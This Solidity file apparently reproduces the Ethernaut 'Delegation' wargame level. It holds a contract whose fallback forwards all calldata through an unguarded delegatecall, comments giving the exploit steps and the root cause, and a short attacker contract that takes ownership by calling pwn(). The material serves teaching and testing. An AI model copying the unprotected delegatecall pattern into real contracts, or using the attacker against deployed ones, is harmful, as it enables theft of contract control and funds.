// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// ──────────────────────────────────────────────────────────────────────────────
//  Ethernaut Level 6 — Delegation
//
//  VULNERABILITY: Unprotected delegatecall forwarded from Delegation to Delegate.
//  The fallback of Delegation blindly delegatecalls into Delegate using msg.data.
//  Because delegatecall runs the callee's code in the CALLER'S storage context,
//  calling pwn() via the fallback makes Delegate.pwn() write to Delegation's
//  storage slot 0 (owner) instead of Delegate's.
//
//  EXPLOIT STEPS:
//  1. Encode the selector for pwn(): bytes4(keccak256("pwn()"))
//  2. Send a transaction to Delegation with that calldata.
//  3. Delegation's fallback fires → delegatecall(Delegate, pwn-selector)
//  4. Delegate.pwn() runs in Delegation's context → owner = msg.sender (attacker)
//
//  ROOT CAUSE: delegatecall should never be used with untrusted input or in a
//  catch-all fallback without strict access control. Always validate the target
//  and the function selector before forwarding.
// ──────────────────────────────────────────────────────────────────────────────

/// @title Delegate
/// @notice Target contract whose pwn() is exploitable via delegatecall
/// @dev Storage slot 0 holds `owner`. When called via delegatecall, writes
///      to the caller's slot 0 instead.
contract Delegate {
    /// @notice The owner of this contract (slot 0)
    address public owner;

    /// @notice Deploy with initial owner
    /// @param _owner Initial owner address
    constructor(address _owner) {
        owner = _owner;
    }

    /// @notice Sets owner to msg.sender — exploitable via delegatecall
    /// @dev When called through delegatecall from another contract, this
    ///      writes msg.sender to the CALLER's storage slot 0 (their owner variable)
    function pwn() public {
        owner = msg.sender;
    }
}

/// @title Delegation
/// @notice Vulnerable contract that blindly delegatecalls into Delegate
/// @dev The fallback function forwards all calldata to the Delegate via delegatecall
///      without any selector validation or access control — this is the vulnerability.
contract Delegation {
    /// @notice The owner of this contract (slot 0 — collides with Delegate.owner)
    address public owner;

    /// @dev Reference to the Delegate contract
    Delegate delegate;

    /// @notice Deploy Delegation pointing to a Delegate instance
    /// @param _delegateAddress Address of the deployed Delegate contract
    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    /// @notice Fallback: forwards ALL calldata to Delegate via delegatecall
    /// @dev VULNERABILITY: No selector validation, no access control.
    ///      Any caller can invoke any function on Delegate in Delegation's storage context.
    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this; // silence unused variable warning
        }
    }
}

// ──────────────────────────────────────────────────────────────────────────────
//  Attacker contract (for use in tests)
// ──────────────────────────────────────────────────────────────────────────────

/// @title DelegationAttacker
/// @notice Demonstrates the exploit by calling pwn() through Delegation's fallback
contract DelegationAttacker {
    /// @notice Claim ownership of the Delegation contract via delegatecall exploit
    /// @param delegation Address of the vulnerable Delegation contract
    /// @dev Encodes pwn() selector and sends it as calldata to trigger the fallback
    function attack(address delegation) external {
        (bool ok,) = delegation.call(abi.encodeWithSignature("pwn()"));
        require(ok, "DelegationAttacker: call failed");
    }
}
